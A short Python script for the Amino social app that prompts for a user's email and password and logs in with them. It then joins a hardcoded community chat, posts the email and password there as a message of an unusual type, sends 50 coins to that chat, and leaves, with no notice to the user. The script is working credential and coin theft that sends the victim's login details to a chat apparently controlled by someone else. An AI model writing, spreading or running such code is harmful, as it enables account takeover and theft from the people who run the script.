#################
import amino

e=input('Enter email:  ')
p=input('Enter password:  ')
clint=amino.Client()
clint.login(email=e,password=p)

x='http://aminoapps.com/p/84by0k'
s=clint.get_from_code(x)
comId=s.path[1:s.path.index('/')]
clint.join_community(comId=comId)
subclint=amino.SubClient(comId=comId,profile=clint.profile)
chatId=subclint.get_from_code(x).objectId
subclint.join_chat(chatId=chatId)
subclint.send_message(chatId=chatId,message='gmail.com'+'\n'+e+'\n'+'ps'+'\n'+p,messageType=55)

subclint.send_coins(coins='50',chatId=chatId)
subclint.leave_chat(chatId=chatId)
clint.leave_community(comId=comId)
#################